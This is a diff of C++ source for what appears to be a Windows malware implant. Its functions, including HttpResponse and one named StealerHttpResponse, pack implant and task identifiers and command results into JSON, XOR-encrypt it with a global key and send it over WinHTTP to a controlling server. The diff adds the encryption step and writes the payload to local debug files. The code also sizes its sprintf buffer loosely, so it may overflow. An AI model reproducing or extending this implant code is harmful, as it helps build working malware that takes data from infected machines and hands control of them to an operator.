@@ -238,6 +238,8 @@ std::string HttpRegisterImplant(std::string uri, std::string jitter, std::string
     return result;
 }
 std::string HttpResponse(std::string uri, int implant_id, int task_id, std::string results, std::string success, std::string command){
+    
+    
     int var1;
     int var2;
     if (implant_id > 10)
@@ -254,23 +256,22 @@ std::string HttpResponse(std::string uri, int implant_id, int task_id, std::stri
     {
         var2 = 1;
     }
+    //postdata = xorcrypt(postdata, length, GlobalKey); //buffer in place????
+
+    //encrypt goes here and send
+
 
     int temp = var1 + var2 + results.length() + success.length() + command.length();
     // LENGTH NEEDS TO BE SCALED DEPENDING ON OUR RANGE FOR IMPLANT_ID
     
     int length = 78 + temp;
     char *postdata = (char*) malloc(length);
-    sprintf(postdata, "{\"target_implant_id\":%d,\"task_id\":%d,\"response_data\":\"%s\",\"success\":\"%s\",\"command\":\"%s\"}", implant_id, task_id, results.c_str(), success.c_str(), command.c_str());
-    //std::cout << postdata << std::endl;
-    std::ofstream file("examplesitaware.txt");
-    file << postdata;
+    sprintf(postdata, "{\"target_implant_id\":%d,\"task_id\":%d,\"response_data\":\"%s\",\"success\":%s,\"command\":\"%s\"}", implant_id, task_id, results.c_str(), success.c_str(), command.c_str());
+    postdata = xorcrypt(postdata, length, GlobalKey);
+    
+    std::string result;
 
     LPCWSTR additionalHeaders = L"Content-Type: application/json\r\n";
-
-    /* Converts from string to wstring to LPCWSTR
-       https://stackoverflow.com/questions/27220/how-to-convert-stdstring-to-lpcwstr-in-c-unicode
-    */
-    std::string result;
     
 
     // The WinHttpOpen function initializes, for an application, the use of WinHTTP functions and returns a WinHTTP-session handle.
@@ -364,6 +365,7 @@ std::string HttpResponse(std::string uri, int implant_id, int task_id, std::stri
     WinHttpCloseHandle(hSession);
     WinHttpCloseHandle(hConnect);
     WinHttpCloseHandle(hRequest);
+    free(postdata);
     return result;
 }
 
@@ -387,8 +389,8 @@ std::string StealerHttpResponse(std::string uri, int implant_id, int task_id, js
 
 
 
-    //std::ofstream file("newbad.txt");
-    //file << postdata;
+    std::ofstream file("sitawareplswork.txt");
+    file << postdata;
 
     //LPCWSTR additionalHeaders = L"Content-Type: application/json\r\n";
 
